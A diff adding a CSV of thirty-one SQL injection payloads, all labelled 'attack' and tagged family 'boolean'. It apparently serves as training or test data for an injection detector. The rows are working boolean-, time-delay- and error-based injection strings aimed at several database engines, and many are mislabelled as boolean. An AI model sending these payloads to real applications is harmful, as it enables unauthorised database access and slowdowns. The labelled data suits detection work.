@@ -1,0 +1,32 @@
+label,payload,family
+attack,""" or isNULL  (  1/0  )   /*",boolean
+attack,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",boolean
+attack,1%'   )    )     )   and 1661  =  7683,boolean
+attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",boolean
+attack,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
+attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",boolean
+attack,-9148  )   where 2027  =  2027 or 8571  =  8571--,boolean
+attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",boolean
+attack,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
+attack,1'   )    )    and 2832  =  4165--,boolean
+attack,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,boolean
+attack,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean
+attack,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
+attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",boolean
+attack,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',boolean
+attack,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
+attack,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
+attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",boolean
+attack,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",boolean
+attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",boolean
+attack,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",boolean
+attack,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
+attack,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",boolean
+attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",boolean
+attack,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
+attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",boolean
+attack,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",boolean
+attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,boolean
+attack,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",boolean
+attack,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
+attack,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
